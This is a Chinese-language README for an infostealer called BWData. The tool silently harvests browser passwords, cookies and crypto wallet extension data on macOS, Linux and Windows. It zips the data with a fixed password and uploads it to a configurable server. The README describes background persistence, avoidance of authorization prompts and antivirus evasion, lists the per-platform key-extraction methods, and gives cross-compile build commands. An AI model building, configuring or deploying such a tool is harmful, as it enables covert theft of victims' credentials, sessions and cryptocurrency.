# BWData

从本机浏览器静默提取 passwords、cookies 与加密货币钱包插件数据，打包为加密 ZIP 并上传服务端。启动即执行、无需命令行参数，适合通过 LaunchAgent 等后台托管。

## 功能

- **密码 / Cookie**：自动发现本机浏览器（Chrome、Edge、Brave、Opera、Firefox、Safari 等）并提取登录密码与 Cookie
- **钱包插件**：收集 MetaMask / OKX / Bitget / Gate / Braavos 等扩展的存储目录（Chrome 系 `Local Extension Settings`、Firefox `browser-extension-data/<guid>`），随包上传
- **加密打包**：ZipCrypto 加密 ZIP（口令 `wt123321`），明文中间文件即写即删
- **静默上传**：multipart 字段 `query`，HTTP 200 视为成功，失败自动重试 3 次
- **幂等防重复**：上传成功写成功标记，重复启动静默退出（macOS/Linux 标记文件，Windows 注册表）
- **静默无感知**：无 TTY 不等待输入；macOS 仅在钥匙串已解锁的登录会话内查询，绝不弹授权窗口

## 编译

纯 Go、无 CGO，可交叉编译，产物为静态二进制（`-trimpath -buildvcs=false -ldflags="-s -w"`）。在项目根目录执行：

```bash
# macOS、Linux、Windows 各构建一个平台示例（GOOS 换成 darwin/linux/windows 即可）
CGO_ENABLED=0 GOOS=darwin GOARCH=arm64 go build -trimpath -buildvcs=false -ldflags="-s -w" -o bwdata-darwin-arm64 ./cmd/bwdata
CGO_ENABLED=0 GOOS=linux  GOARCH=amd64 go build -trimpath -buildvcs=false -ldflags="-s -w" -o bwdata-linux-amd64 ./cmd/bwdata
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -trimpath -buildvcs=false -ldflags="-s -w" -o bwdata-windows-amd64.exe ./cmd/bwdata
```

## 运行流程

发现浏览器 → 注入主密钥提取器（macOS/Linux 无，Windows 有） → 提取密码 / Cookie → 收集钱包 → ZipCrypto 打包 → 上传（HTTP 200）→ 写成功标记。无可用数据则不上传、不写标记，留待后续运行。

## 平台说明

三平台大流程共用同一份 `cmd/bwdata/main.go`，仅下表列出的部分按平台实现：

| 环节     | macOS                | Linux                     | Windows |
|----------|----------------------|---------------------------|-------------------------|
| v10 密钥 | 钥匙串（keychain）    | 硬编码 `peanuts`（PBKDF2） | DPAPI 解 Local State |
| v11 密钥 | —                    | D-Bus Secret Service 钥匙环 | — |
| v20 密钥 | —                    | —                         | App-Bound Encryption（ABE） |
| 成功标记 | 标记文件              | 标记文件                   | 注册表 |
| 浏览器表 | macOS 系（含 Safari） | Linux 系 | Windows 系（含 360 / QQ / 搜狗等） |

- v10 / v11 走 AES-128-CBC，v20 走 AES-256-GCM（密文布局跨平台一致）
- **v20 仅 Chrome 127+ Windows 使用（ABE）**：macOS / Linux 本机不产生 v20 密文，故 V20 槽位为 nil、不获取，不影响本机密码 / Cookie 提取；从 Windows dump 恢复时 v20 键仍可跨平台解密
- **为何不用 Windows**：Windows 获取主密钥需远程线程注入 + 反射加载 DLL、修改浏览器进程内存（ABE 自检），极易被杀软报毒；macOS / Linux 走系统原生凭据机制（钥匙串 / D-Bus），全程不改进程内存，天然安静，故生产部署以 macOS / Linux 为主

## 目录结构

```
cmd/bwdata/      主程序（main.go 主流程 / wallet.go 钱包 / upload.go 上传 / marker_*.go 标记）
browser/         浏览器发现与提取引擎（chromium / firefox / safari）
masterkey/       主密钥获取与解密（macOS 钥匙串、Linux D-Bus、Windows DPAPI/ABE）
crypto/          加解密（CBC / GCM / DPAPI）
utils/           machineid / zipcrypto / sqliteutil / winapi 等
```

## 配置点

| 配置 | 位置 |
|---|---|
| 上传地址 | `cmd/bwdata/upload.go` → `uploadURL` |
| ZIP 密码 | `cmd/bwdata/main.go` → `zipPassword` |
| 上传字段名 | `cmd/bwdata/upload.go` → `uploadFieldName` |
| 钱包扩展 ID | `core/wallet.go` → `walletExts`（Chromium id 与 Firefox guid） |